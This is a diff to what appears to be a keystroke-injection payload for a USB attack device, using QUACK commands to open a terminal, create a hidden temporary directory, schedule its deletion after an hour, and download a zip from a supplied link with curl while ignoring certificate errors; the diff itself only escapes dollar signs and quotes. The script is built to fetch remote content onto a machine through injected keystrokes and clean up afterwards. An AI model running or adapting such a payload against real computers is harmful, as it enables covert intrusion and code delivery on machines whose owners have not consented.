@@ -26,22 +26,22 @@ QUACK CTRL-ALT t
 QUACK DELAY 2000
 
 # Create a random directory
-QUACK STRING dir_name=$(mktemp -d)
+QUACK STRING dir_name=\$(mktemp -d)
 QUACK ENTER
 QUACK DELAY 500
 
 # Delete the directory after 60 minutes (3600 seconds)
-QUACK STRING (sleep 3600 && rm -rf $dir_name) &
+QUACK STRING (sleep 3600 && rm -rf \$dir_name) &
 QUACK ENTER
 QUACK DELAY 500
 
 # Move into the directory
-QUACK STRING cd $dir_name
+QUACK STRING cd \$dir_name
 QUACK ENTER
 QUACK DELAY 500
 
 # Download the zip from your own link
-QUACK STRING curl -LOk "$ZIP_LINK"
+QUACK STRING curl -LOk \"$ZIP_LINK\"
 QUACK ENTER
 QUACK DELAY 500
 
